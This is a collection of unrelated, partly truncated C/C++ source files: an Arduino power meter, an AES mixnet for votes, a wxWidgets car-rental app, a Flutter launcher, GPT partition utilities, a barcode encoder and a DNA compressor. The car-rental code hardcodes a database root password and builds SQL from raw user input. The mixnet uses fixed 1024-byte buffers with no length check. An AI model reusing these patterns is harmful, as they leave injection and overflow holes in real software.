    "#include <Arduino.h>\n#include <ACS712.h>\n#include <SD.h>\n#include <SPI.h>\n#include <Wire.h>\n#include <Adafruit_GFX.h>\n#include <Adafruit_SSD1306.h>\n\n#define SCREEN_WIDTH 128 // OLED display width, in pixels\n#define SCREEN_HEIGHT 64 // OLED display height, in pixels\n\n// Declaration for SSD1306 display connected using I2C\n#define OLED_RESET -1 // Reset pin\n#define SCREEN_ADDRESS 0x3C\n#define PIN_SPI_CS 5\n#define VOLTAGE 227\n\nfloat power_factor = 0.365;\n\nint sensorPin = 25;\n\nFile myFile;\n\nAdafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);\n\nACS712 currentSensor(35, 3.3, 4095, 185);\n\nunsigned long long currentTime = 0;\nunsigned long long previousTime = 0;\nunsigned long long delayTime = 30000; // write to sd card every 30 seconds\n\nvoid setup()\n{\n  Serial.begin(115200);\n\n  // initialize the OLED object\n  if (!display.begin(SSD1306_SWITCHCAPVCC, SCREEN_ADDRESS))\n  {\n    Serial.println(F(\"SSD1306 allocation failed\"));\n    for (;;)\n      ; // Don't proceed, loop forever\n  }\n\n  if (!SD.begin(PIN_SPI_CS))\n  {\n    while (1)\n    {\n      Serial.println(F(\"SDCARD Failed\"));\n      delay(1000);\n    }\n  }\n\n  Serial.println(\"SD INITIALIZED\");\n  Serial.println(\"OLED INITIALIZED\");\n  // Clear the buffer.\n  display.clearDisplay();\n\n  // Display Text\n  display.setTextSize(2);\n  display.setTextColor(WHITE);\n\n  delay(5000);\n}\n\nvoid loop()\n{\n  currentTime = millis();\n  display.clearDisplay();\n\n  float current = currentSensor.mA_AC() / 1000;\n  (current <= 0.1) ? (current = 0) : (current += 0.2);\n  // float voltage = voltageSensor.getVoltageAC();\n\n  float Wattage = current * VOLTAGE * power_factor;\n\n  float Energy = ((Wattage / 1000.0) * ((currentTime / 1000.0) / 3600.0));\n\n  display.setCursor(0, 10);\n  display.printf(\"%.2f A\\n\", current);\n  display.printf(\"%.1f W\\n\", Wattage);\n  display.printf(\"%.4f KWh\", Energy);\n\n  Serial.printf(\"%.2f A\\n\", current);\n  Serial.printf(\"%.2f,%.5f\\n\", Wattage, Energy);\n  \n  //write to SD card every (delayTime)seconds\n  if ((currentTime - previousTime) > delayTime)\n  {\n    myFile = SD.open(\"/PowerReadingsPROPER2.txt\", FILE_APPEND);\n    myFile.printf(\"%.1f,%.5f\\n\", Wattage, Energy);\n    myFile.close();\n    previousTime = currentTime;\n  }\n\n  display.display();\n\n  delay(1000);\n}\n",
    "#include \"mixnet.h\"\r\n#include <iostream>\r\n#include <fstream>\r\n#include <random>\r\n#include <algorithm>\r\n#include <chrono>\r\n#include <openssl/conf.h>\r\n#include <openssl/evp.h>\r\n#include <openssl/err.h>\r\n#include <openssl/rand.h>\r\n#include <filesystem>\r\n\r\nusing namespace std;\r\nusing namespace std::chrono;\r\n\r\nvoid AES::handleErrors() {\r\n    ERR_print_errors_fp(stderr);\r\n    abort();\r\n}\r\n\r\nvoid AES::generate_key(unsigned char* key) {\r\n    if (!RAND_bytes(key, 32)) {\r\n        handleErrors();\r\n    }\r\n}\r\n\r\nvoid AES::generate_iv(unsigned char* iv) {\r\n    if (!RAND_bytes(iv, 16)) {\r\n        handleErrors();\r\n    }\r\n}\r\n\r\nstring AES::encrypt(const unsigned char* key, const string& plaintext) {\r\n    EVP_CIPHER_CTX* ctx;\r\n    int len;\r\n    int ciphertext_len;\r\n    unsigned char ciphertext[1024];  \r\n    unsigned char iv[16];\r\n\r\n    generate_iv(iv);\r\n\r\n    if (!(ctx = EVP_CIPHER_CTX_new())) {\r\n        handleErrors();\r\n    }\r\n\r\n    if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cfb(), NULL, key, iv)) {\r\n        handleErrors();\r\n    }\r\n\r\n    if (1 != EVP_EncryptUpdate(ctx, ciphertext, &len, reinterpret_cast<const unsigned char*>(plaintext.c_str()), plaintext.length())) {\r\n        handleErrors();\r\n    }\r\n    ciphertext_len = len;\r\n\r\n    if (1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len)) {\r\n        handleErrors();\r\n    }\r\n    ciphertext_len += len;\r\n\r\n    EVP_CIPHER_CTX_free(ctx);\r\n\r\n    string encrypted_message(reinterpret_cast<char*>(ciphertext), ciphertext_len);\r\n    string iv_str(reinterpret_cast<char*>(iv), 16);\r\n\r\n    return iv_str + encrypted_message;\r\n}\r\n\r\nstring AES::decrypt(const unsigned char* key, const string& ciphertext) {\r\n    EVP_CIPHER_CTX* ctx;\r\n    int len;\r\n    int plaintext_len;\r\n    unsigned char plaintext[1024];\r\n    unsigned char iv[16];\r\n\r\n    memcpy(iv, ciphertext.c_str(), 16);\r\n\r\n    if (!(ctx = EVP_CIPHER_CTX_new())) {\r\n        handleErrors();\r\n    }\r\n\r\n    if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cfb(), NULL, key, iv)) {\r\n        handleErrors();\r\n    }\r\n\r\n    if (1 != EVP_DecryptUpdate(ctx, plaintext, &len, reinterpret_cast<const unsigned char*>(ciphertext.c_str() + 16), ciphertext.length() - 16)) {\r\n        handleErrors();\r\n    }\r\n    plaintext_len = len;\r\n\r\n    if (1 != EVP_DecryptFinal_ex(ctx, plaintext + len, &len)) {\r\n        handleErrors();\r\n    }\r\n    plaintext_len += len;\r\n\r\n    EVP_CIPHER_CTX_free(ctx);\r\n\r\n    return string(reinterpret_cast<char*>(plaintext), plaintext_len);\r\n}\r\n\r\nMixingNode::MixingNode() {\r\n    AES::generate_key(key);\r\n}\r\n\r\nvector<string> MixingNode::mix(const vector<string>& messages) {\r\n    vector<string> encrypted_messages;\r\n    for (const auto& msg : messages) {\r\n        string encrypted_message = AES::encrypt(key, msg);\r\n        encrypted_messages.push_back(encrypted_message);\r\n    }\r\n    random_device rd;\r\n    mt19937 g(rd());\r\n    shuffle(encrypted_messages.begin(), encrypted_messages.end(), g);\r\n    return encrypted_messages;\r\n}\r\n\r\nvector<string> MixingNode::demix(const vector<string>& messages) {\r\n    vector<string> decrypted_messages;\r\n    for (const auto& msg : messages) {\r\n        string decrypted_message = AES::decrypt(key, msg);\r\n        decrypted_messages.push_back(decrypted_message);\r\n    }\r\n    return decrypted_messages;\r\n}\r\n\r\nvector<Vote> load_votes(const string& directory) {\r\n    vector<Vote> votes;\r\n    for (const auto& entry : filesystem::directory_iterator(directory)) {\r\n        if (entry.path().extension() == \".json\") {\r\n            ifstream file(entry.path());\r\n            if (file.is_open()) {\r\n                json j;\r\n                try {\r\n                    file >> j;\r\n                    Vote vote = j.get<Vote>();\r\n                    votes.push_back(vote);\r\n                } catch (json::parse_error& e) {\r\n                    cerr << \"Error parsing file \" << entry.path() << \": \" << e.what() << endl;\r\n                }\r\n            }\r\n        }\r\n    }\r\n    return votes;\r\n}\r\n\r\nvoid save_encrypted_messages(const vector<string>& messages, const string& output_dir, const string& prefix) {\r\n    if (!filesystem::exists(output_dir)) {\r\n        filesystem::create_directory(output_dir);\r\n    }\r\n    for (size_t i = 0; i < messages.size(); ++i) {\r\n        ofstream file(output_dir + \"/\" + prefix + to_string(i + 1) + \".enc\");\r\n        if (file.is_open()) {\r\n            file << messages[i];\r\n        }\r\n    }\r\n}\r\n\r\nvoid save_decrypted_messages(const vector<Vote>& votes, const string& output_dir, const string& prefix) {\r\n    if (!filesystem::exists(output_dir)) {\r\n        filesystem::create_directory(output_dir);\r\n    }\r\n    for (size_t i = 0; i < votes.size(); ++i) {\r\n        ofstream file(output_dir + \"/\" + prefix + to_string(i + 1) + \".json\");\r\n        if (file.is_open()) {\r\n            file << \"{\\n\";\r\n            file << \"    \\\"voter_id\\\": \\\"\" << votes[i].voter_id << \"\\\",\\n\";\r\n            file << \"    \\\"vote\\\": \\\"\" << votes[i].vote << \"\\\",\\n\";\r\n            file << \"    \\\"timestamp\\\": \\\"\" << votes[i].timestamp << \"\\\",\\n\";\r\n            file << \"  ",
    "#include <wx/wx.h>\n#include <wx/animate.h>\n#include <wx/mstream.h>\n#include <wx/image.h>\n#include <wx/grid.h>\n#include <wx/bmpbuttn.h>\n#include <wx/datetime.h>\n#include <wx/bitmap.h>\n#include <iostream>\n#include <sstream>\n#include <string>\n\n#include \"database.h\"\n#include \"car.h\"\n#include \"customer.h\"\n#include \"rental.h\"\n\nclass MyApp : public wxApp {\npublic:\n    virtual bool OnInit();\n};\n\nclass MyFrame : public wxFrame {\npublic:\n    MyFrame(const wxString& title);\n\n    void OnExit(wxCommandEvent& event);\n    void OnAbout(wxCommandEvent& event);\n    void OnAddCar(wxCommandEvent& event);\n    void OnAddCustomer(wxCommandEvent& event);\n    void OnRentCar(wxCommandEvent& event);\n    void OnReturnCar(wxCommandEvent& event);\n\nprivate:\n    wxDECLARE_EVENT_TABLE();\n    Database db;\n};\n\nenum {\n    ID_AddCar = 1,\n    ID_AddCustomer,\n    ID_RentCar,\n    ID_ReturnCar\n};\n\nwxBEGIN_EVENT_TABLE(MyFrame, wxFrame)\nEVT_BUTTON(ID_AddCar, MyFrame::OnAddCar)\nEVT_BUTTON(ID_AddCustomer, MyFrame::OnAddCustomer)\nEVT_BUTTON(ID_RentCar, MyFrame::OnRentCar)\nEVT_BUTTON(ID_ReturnCar, MyFrame::OnReturnCar)\nEVT_MENU(wxID_EXIT, MyFrame::OnExit)\nEVT_MENU(wxID_ABOUT, MyFrame::OnAbout)\nwxEND_EVENT_TABLE()\n\nwxIMPLEMENT_APP(MyApp);\n\nbool MyApp::OnInit() {\n    wxInitAllImageHandlers(); \n    MyFrame* frame = new MyFrame(\"Car Rental Management System\");\n    frame->Show(true);\n    return true;\n}\n\nMyFrame::MyFrame(const wxString& title)\n    : wxFrame(NULL, wxID_ANY, title, wxDefaultPosition, wxSize(1200, 600)),\n    db(\"tcp://127.0.0.1:3306\", \"root\", \"P@$$W0rd\", \"car_rental\") {\n\n    \n    wxColour backgroundColor(\"#C7E5C7\"); \n    SetBackgroundColour(backgroundColor);\n\n   \n    wxAnimationCtrl* animCtrl = new wxAnimationCtrl(this, wxID_ANY, wxNullAnimation, wxPoint(400, 0));\n    wxAnimation animation;\n    if (animation.LoadFile(\"C:/Users/adity/Downloads/car-boss.gif\")) {\n        animCtrl->SetAnimation(animation);\n        animCtrl->Play();\n    }\n    else {\n        wxLogError(\"Failed to load car-boss.gif\");\n    }\n\n    \n    wxFont buttonFont(12, wxFONTFAMILY_DEFAULT, wxFONTSTYLE_NORMAL, wxFONTWEIGHT_NORMAL);\n    wxColour buttonColor(\"#4CAF50\"); \n    wxButton* addCarButton = new wxButton(this, ID_AddCar, \"Add Car\", wxPoint(50, 50), wxSize(200, 50));\n    addCarButton->SetFont(buttonFont);\n    addCarButton->SetBackgroundColour(buttonColor);\n\n    wxButton* addCustomerButton = new wxButton(this, ID_AddCustomer, \"Add Customer\", wxPoint(50, 120), wxSize(200, 50));\n    addCustomerButton->SetFont(buttonFont);\n    addCustomerButton->SetBackgroundColour(buttonColor);\n\n    wxButton* rentCarButton = new wxButton(this, ID_RentCar, \"Rent Car\", wxPoint(50, 190), wxSize(200, 50));\n    rentCarButton->SetFont(buttonFont);\n    rentCarButton->SetBackgroundColour(buttonColor);\n\n    wxButton* returnCarButton = new wxButton(this, ID_ReturnCar, \"Return Car\", wxPoint(50, 260), wxSize(200, 50));\n    returnCarButton->SetFont(buttonFont);\n    returnCarButton->SetBackgroundColour(buttonColor);\n\n    \n    wxMenu* menuFile = new wxMenu;\n    menuFile->Append(ID_AddCar, \"Add Car...\\tCtrl-A\", \"Add a new car\");\n    menuFile->Append(ID_AddCustomer, \"Add Customer...\\tCtrl-C\", \"Add a new customer\");\n    menuFile->Append(ID_RentCar, \"Rent Car...\\tCtrl-R\", \"Rent a car\");\n    menuFile->Append(ID_ReturnCar, \"Return Car...\\tCtrl-T\", \"Return a rented car\");\n    menuFile->AppendSeparator();\n    menuFile->Append(wxID_EXIT);\n\n    wxMenuBar* menuBar = new wxMenuBar;\n    menuBar->Append(menuFile, \"&File\");\n\n    wxMenu* menuHelp = new wxMenu;\n    menuHelp->Append(wxID_ABOUT);\n    menuBar->Append(menuHelp, \"&Help\");\n\n    SetMenuBar(menuBar);\n    CreateStatusBar();\n    SetStatusText(\"Welcome to Car Rental Management System\");\n\n    \n    try {\n        db.connect();\n        SetStatusText(\"Database connected successfully\");\n    }\n    catch (sql::SQLException& e) {\n        wxMessageBox(\"Error connecting to database: \" + wxString(e.what()), \"Database Error\", wxOK | wxICON_ERROR);\n    }\n}\n\nvoid MyFrame::OnExit(wxCommandEvent& event) {\n    Close(true);\n}\n\nvoid MyFrame::OnAbout(wxCommandEvent& event) {\n    wxMessageBox(\"This is a Car Rental Management System using wxWidgets by Aditya Singh\", \"About Car Rental\", wxOK | wxICON_INFORMATION);\n}\n\nvoid MyFrame::OnAddCar(wxCommandEvent& event) {\n    wxTextEntryDialog dialog(this, \"Enter Car Details (id, make, model, year, price)\", \"Add Car\", \"\", wxTextEntryDialogStyle, wxDefaultPosition);\n    if (dialog.ShowModal() == wxID_OK) {\n        wxString carDetails = dialog.GetValue();\n        int id, year;\n        double price;\n        std::string make, model;\n        std::istringstream iss(std::string(carDetails.mb_str()));\n        iss >> id >> make >> model >> year >> price;\n        Car car(id, make, model, year, price);\n        db.executeQuery(\"INSERT INTO cars (id, make, model, year, price) VALUES (\" +\n            std::to_string(car.getId()) + \", '\" + car.getMake() + \"', '\" + car.getModel() + \"', \" +\n            std::to_string(car.getYear()) + \", \" + std::to_string(car.getPrice()) ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"harga_crypto\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n\nusing namespace std;\n\n//int main()\n//{\n//    cout << \"\\tresume:\" << endl;\n//    cout << \"name:abdulxaliq \";\n//    cout << \"surname:agayev \";\n//    cout << \"age:15 \";\n//    cout << \"hobby:driving car \";\n//\n//    return 0;\n//}\n\n//int main()\n//{\n//    cout << \"\\t---\" <<endl;\n//    cout << \"       /   \\\\\" <<endl;\n//    cout << \"      /     \\\\\" << endl;\n//    cout << \"      |     |\" << endl;\n//    cout << \"      |     |\" << endl;\n//    cout << \"      |     |\" << endl;\n//    cout << \"      \\\\     /\" << endl;\n//    cout << \"       \\\\   /\" << endl;\n//    cout << \"\\t---\" << endl;\n//    return 0;\n//}\n\n//int main()\n//{\n//\tcout << \"\\\"To be\" <<endl;\n//\tcout << \"\\tor not\" << endl;\n//\tcout << \"\\t\\tto be!\\\"\" << endl;\n//\tcout << \"\\t\\t\\t/Shakespeare/\" << endl;\n//}\n//int main()\n//{\n//\tcout << \"     Escape sequences\" <<endl;\n//\tcout << \"\\n\\\\a\\tBell (alert)\" << endl;\n//\tcout << \"\\n\\\\b\\tBackspace\" << endl;\n//\tcout << \"\\n\\\\n\\tNew line\" << endl;\n//\tcout << \"\\n\\\\r\\tCarriage return\" << endl;\n//\tcout << \"\\n\\\\t\\tHorizontal tab\" << endl;\n//\tcout << \"\\n\\\\\\\\\\tbackslash \\\\\" << endl;\n//\tcout << \"\\n\\\\\\\"\\tDouble quotation mark\" << endl;\n//\tcout << \"\\n\\\\\\'\\tSingle  quotation mark\" << endl;\n//}\n//int main()\n//{\n//\tcout << \"    *\" << \"       ********\" <<\"        ********* \"<<\"       *           *   \"<<\"        *\"<<\"              *\" <<endl;\n//\tcout << \"   * *\" << \"      *       *\" <<\"       *        *\"<<\"       *           *   \" <<\"        *\" <<\"              *\" << endl;\n//\tcout << \"   * *\" << \"      *        *\" <<\"      *         *\" <<\"      *           *   \" <<\"        *\" <<\"              *\" << endl;\n//\tcout << \"  *   * \" << \"    **********\" <<\"      *          *\"<<\"     *           *   \" <<\"        *\" <<\"              *\" << endl;\n//\tcout << \"  *****\" << \"     *         * \" <<\"    *           *\"<<\"    *           *   \" <<\"        *\" <<\"              *\" << endl;\n//\tcout << \" *     *\" << \"    *          *\" <<\"    *           *\"<<\"    *           *   \" <<\"        *\" <<\"              *\" << endl;\n//\tcout << \" *     *\" << \"    *          *\" <<\"    *          *\"<<\"      *         *   \" <<\"         *\" <<\"              *\" << endl;\n//\tcout << \"*       *\" <<\"   *          *\" <<\"    *         *\"<<\"        *       *   \" <<\"          *\" <<\"              *\" << endl;\n//\tcout << \"*       *\" <<\"   ***********\" <<\"     **********\"<<\"          ******* \" <<\"             ************\" <<\"   ************\" << endl;\n//}\n//int main()\n//{\n//\tcout <<\"\\\"  '\\\\t',   '\\\\n',   '\\\\\\',   '\\\\'',   '\\\\'' ',  \\\"\";\n//}\n//int main()\n//{\n//\tcout << \"        ********************\" << endl;\n//\tcout << \"       *|                 **\" << endl;\n//\tcout << \"      * |                * *\" << endl;\n//\tcout << \"     *  |               *  *\" << endl;\n//\tcout << \"    *   |              *   *\" << endl;\n//\tcout << \"   *    |             *    *\" << endl;\n//\tcout << \"  *     |            *     *\" << endl;\n//\tcout << \" ********************      *\" << endl;\n//\tcout << \" *      |           *      *\" << endl;\n//\tcout << \" *      |           *      *\" << endl;\n//\tcout << \" *      |           *      *\" << endl;\n//\tcout << \" *      |           *      *\" << endl;\n//\tcout << \" *      |           *      *\" << endl;\n//\tcout << \" *      |           *      *\" << endl;\n//\tcout << \" *      |           *      *\" << endl;\n//\tcout << \" *      |           *      *\" << endl;\n//\tcout << \" *      |           *      *\" << endl;\n//\tcout << \" *      |           *      *\" << endl;\n//\tcout << \" *      |           *      *\" << endl;\n//\tcout << \" *      |           *      *\" << endl;\n//\tcout << \" *     /------------*------*\" << endl;\n//\tcout << \" *    /-------------*     *\" << endl;\n//\tcout << \" *   /--------------*    *\" << endl;\n//\tcout << \" *  /---------------*   *\" << endl;\n//\tcout << \" * /----------------*  *\" << endl;\n//\tcout << \" */-----------------* *\" << endl;\n//\tcout << \" *********************\" << endl;\n//}\n//int main()\n//{\n//\tcout << \"#include <iostream>\"<<endl;\n//\tcout << \"using namespace std;\" << endl;\n//\tcout << \"void main()\" << endl;\n//\tcout << \"{\" << endl;\n//\tcout << \"\tcout <<\\\"c++ forever!!!\\\";\"<< endl;\n//\tcout << \"}\" << endl;\n//\n//}\n",
    "/*\n * Copyright (c) 2013,2016, The Linux Foundation. All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are\n * met:\n *     * Redistributions of source code must retain the above copyright\n *       notice, this list of conditions and the following disclaimer.\n *     * Redistributions in binary form must reproduce the above\n *       copyright notice, this list of conditions and the following\n *       disclaimer in the documentation and/or other materials provided\n *       with the distribution.\n *     * Neither the name of The Linux Foundation nor the names of its\n *       contributors may be used to endorse or promote products derived\n *       from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY EXPRESS OR IMPLIED\n * WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\n * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT\n * ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS\n * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR\n * BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\n * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE\n * OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN\n * IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n */\n\n#define _LARGEFILE64_SOURCE /* enable lseek64() */\n\n/******************************************************************************\n * INCLUDE SECTION\n ******************************************************************************/\n#include <fcntl.h>\n#include <string.h>\n#include <errno.h>\n#include <sys/stat.h>\n#include <sys/ioctl.h>\n#include <scsi/ufs/ioctl.h>\n#include <scsi/ufs/ufs.h>\n#include <unistd.h>\n#include <linux/fs.h>\n#include <limits.h>\n#include <dirent.h>\n#include <inttypes.h>\n#include <linux/kernel.h>\n#include <map>\n#include <vector>\n#include <string>\n#define LOG_TAG \"gpt-utils\"\n#include <cutils/log.h>\n#include <cutils/properties.h>\n#include \"gpt-utils.h\"\n#include <endian.h>\n#include <zlib.h>\n\n\n/******************************************************************************\n * DEFINE SECTION\n ******************************************************************************/\n#define BLK_DEV_FILE    \"/dev/block/mmcblk0\"\n/* list the names of the backed-up partitions to be swapped */\n/* extension used for the backup partitions - tzbak, abootbak, etc. */\n#define BAK_PTN_NAME_EXT    \"bak\"\n#define XBL_PRIMARY         \"/dev/block/bootdevice/by-name/xbl\"\n#define XBL_BACKUP          \"/dev/block/bootdevice/by-name/xblbak\"\n#define XBL_AB_PRIMARY      \"/dev/block/bootdevice/by-name/xbl_a\"\n#define XBL_AB_SECONDARY    \"/dev/block/bootdevice/by-name/xbl_b\"\n/* GPT defines */\n#define MAX_LUNS                    26\n//Size of the buffer that needs to be passed to the UFS ioctl\n#define UFS_ATTR_DATA_SIZE          32\n//This will allow us to get the root lun path from the path to the partition.\n//i.e: from /dev/block/sdaXXX get /dev/block/sda. The assumption here is that\n//the boot critical luns lie between sda to sdz which is acceptable because\n//only user added external disks,etc would lie beyond that limit which do not\n//contain partitions that interest us here.\n#define PATH_TRUNCATE_LOC (sizeof(\"/dev/block/sda\") - 1)\n\n//From /dev/block/sda get just sda\n#define LUN_NAME_START_LOC (sizeof(\"/dev/block/\") - 1)\n#define BOOT_LUN_A_ID 1\n#define BOOT_LUN_B_ID 2\n/******************************************************************************\n * MACROS\n ******************************************************************************/\n\n\n#define GET_4_BYTES(ptr)    ((uint32_t) *((uint8_t *)(ptr)) | \\\n        ((uint32_t) *((uint8_t *)(ptr) + 1) << 8) | \\\n        ((uint32_t) *((uint8_t *)(ptr) + 2) << 16) | \\\n        ((uint32_t) *((uint8_t *)(ptr) + 3) << 24))\n\n#define GET_8_BYTES(ptr)    ((uint64_t) *((uint8_t *)(ptr)) | \\\n        ((uint64_t) *((uint8_t *)(ptr) + 1) << 8) | \\\n        ((uint64_t) *((uint8_t *)(ptr) + 2) << 16) | \\\n        ((uint64_t) *((uint8_t *)(ptr) + 3) << 24) | \\\n        ((uint64_t) *((uint8_t *)(ptr) + 4) << 32) | \\\n        ((uint64_t) *((uint8_t *)(ptr) + 5) << 40) | \\\n        ((uint64_t) *((uint8_t *)(ptr) + 6) << 48) | \\\n        ((uint64_t) *((uint8_t *)(ptr) + 7) << 56))\n\n#define PUT_4_BYTES(ptr, y)   *((uint8_t *)(ptr)) = (y) & 0xff; \\\n        *((uint8_t *)(ptr) + 1) = ((y) >> 8) & 0xff; \\\n        *((uint8_t *)(ptr) + 2) = ((y) >> 16) & 0xff; \\\n        *((uint8_t *)(ptr) + 3) = ((y) >> 24) & 0xff;\n\n/******************************************************************************\n * TYPES\n ******************************************************************************/\nusing namespace std;\nenum gpt_state {\n    GPT_OK = 0,\n    GPT_BAD_SIGNATURE",
    "#include <string>\n#include <iostream>\n#include <unordered_map>\n#include \"code39.h\"\n#include \"imgGenerator.h\"\n\nstd::unordered_map<std::string, std::wstring> code39Encodeing = {\n\t{\"1\", L\"\u25ae| ||\u25ae\"},\n\t{\"A\", L\"\u25ae|| |\u25ae\"},\n\t{\"K\", L\"\u25ae||| \u25ae\"},\n\t{\"U\", L\"\u25ae |||\u25ae\"},\n\t{\"2\", L\"|\u25ae ||\u25ae\"},\n\t{\"B\", L\"|\u25ae| |\u25ae\"},\n\t{\"L\", L\"|\u25ae|| \u25ae\"},\n\t{\"V\", L\"| \u25ae||\u25ae\"},\n\t{\"3\", L\"\u25ae\u25ae |||\"},\n\t{\"C\", L\"\u25ae\u25ae| ||\"},\n\t{\"M\", L\"\u25ae\u25ae|| |\"},\n\t{\"W\", L\"\u25ae \u25ae|||\"},\n\t{\"4\", L\"|| \u25ae|\u25ae\"},\n\t{\"D\", L\"||\u25ae |\u25ae\"},\n\t{\"N\", L\"||\u25ae| \u25ae\"},\n\t{\"X\", L\"| |\u25ae|\u25ae\"},\n\t{\"5\", L\"\u25ae| \u25ae||\"},\n\t{\"E\", L\"\u25ae|\u25ae ||\"},\n\t{\"O\", L\"\u25ae|\u25ae| |\"},\n\t{\"Y\", L\"\u25ae |\u25ae||\"},\n\t{\"6\", L\"|\u25ae \u25ae||\"},\n\t{\"F\", L\"|\u25ae\u25ae ||\"},\n\t{\"P\", L\"|\u25ae\u25ae| |\"},\n\t{\"Z\", L\"| \u25ae\u25ae||\"},\n\t{\"7\", L\"|| |\u25ae\u25ae\"},\n\t{\"G\", L\"||| \u25ae\u25ae\"},\n\t{\"Q\", L\"|||\u25ae \u25ae\"},\n\t{\"-\", L\"| ||\u25ae\u25ae\"},\n\t{\"8\", L\"\u25ae| |\u25ae|\"},\n\t{\"H\", L\"\u25ae|| \u25ae|\"},\n\t{\"R\", L\"\u25ae||\u25ae |\"},\n\t{\".\", L\"\u25ae ||\u25ae|\"},\n\t{\"9\", L\"|\u25ae |\u25ae|\"},\n\t{\"I\", L\"|\u25ae| \u25ae|\"},\n\t{\"S\", L\"|\u25ae|\u25ae |\"},\n\t{\" \", L\"| \u25ae|\u25ae|\"},\n\t{\"0\", L\"|| \u25ae\u25ae|\"},\n\t{\"J\", L\"||\u25ae \u25ae|\"},\n\t{\"T\", L\"||\u25ae\u25ae |\"},\n\t{\"*\", L\"| |\u25ae\u25ae|\"},\n\t{\"$\", L\"| | | ||\"},\n\t{\"/\", L\"| | || |\"},\n\t{\"+\", L\"| || | |\"},\n\t{\"%\", L\"|| | | |\"}\n};\n\nint Code39Standard(const std::string& input, const std::string& path) {\n\tstd::wstring data = L\"\";\n\tdata += code39Encodeing.at(\"*\");\n    for (char c : input) {\n        try {\n            data += code39Encodeing.at(std::string(1, c));\n        } catch (const std::out_of_range& e) {\n            std::cerr << \"Invalid character: \" << c << std::endl;\n            return 1;\n        }\n    }\n    data += code39Encodeing.at(\"*\");\n    generateCode39IMG(data, path, input);\n    return 0;\n}\n\nint Code39Raw(const std::string& input, const std::string& path) {\n\tstd::wstring data = L\"\";\n    for (char c : input) {\n        try {\n            data += code39Encodeing.at(std::string(1, c));\n        } catch (const std::out_of_range& e) {\n            std::cerr << \"Invalid character: \" << c << std::endl;\n            return 1;\n        }\n    }\n    generateCode39IMG(data, path, input);\n    return 0;\n}",
    "#include \"rlz.h\"\n\nRLZ::RLZ(std::string ref_file, std::string seq_file)\n    : ref_file(ref_file), seq_file(seq_file) {\n    load_file_to_vector(ref_file, ref_vec);\n    load_file_to_vector(seq_file, seq_vec);\n}\n\nvoid RLZ::load_file_to_vector(const std::string& file_path,\n                              seqan3::bitpacked_sequence<seqan3::dna5>& vec) {\n    std::ifstream file(file_path);\n    if (!file) {\n        throw std::runtime_error(\"Failed to open file: \" + file_path);\n    }\n\n    std::string line;\n    while (std::getline(file, line)) {\n        for (char c : line) {\n            vec.push_back(seqan3::assign_char_to(c, seqan3::dna5{}));\n        }\n    }\n}\n\nvoid RLZ::compress() {\n    if (!compressed.empty()) {\n        compressed.clear();\n    }\n    fm = seqan3::fm_index(ref_vec);\n    {\n        std::ofstream os(ref_file.substr(0, ref_file.find('.')) + \".fmi\",\n                         std::ios::binary);\n        cereal::BinaryOutputArchive archive(os);\n        archive(fm);\n    }\n    auto cursor = fm.cursor();\n    size_t size = 0;\n\n    for (size_t i = 0; i < seq_vec.size(); ++i) {\n        if (cursor.extend_right(seqan3::assign_char_to(\n                seqan3::to_char(seq_vec[i]), seqan3::dna5{}))) {\n            ++size;\n        } else {\n            compressed.emplace_back(cursor.locate().front().second, size);\n            cursor = fm.cursor();\n            cursor.extend_right(seqan3::assign_char_to(\n                seqan3::to_char(seq_vec[i]), seqan3::dna5{}));\n            size = 1;\n        }\n    }\n\n    compressed.emplace_back(cursor.locate().front().second, size);\n    {\n        std::ofstream os(seq_file.substr(0, seq_file.find('.')) + \".rlz\",\n                         std::ios::binary);\n        cereal::BinaryOutputArchive archive(os);\n        archive(compressed);\n    }\n}\n\nvoid RLZ::decompress() {\n    {\n        std::ifstream is(seq_file.substr(0, seq_file.find('.')) + \".rlz\",\n                         std::ios::binary);\n        cereal::BinaryInputArchive archive(is);\n        archive(compressed);\n    }\n    {\n        std::ifstream is(ref_file.substr(0, ref_file.find('.')) + \".fmi\",\n                         std::ios::binary);\n        cereal::BinaryInputArchive archive(is);\n        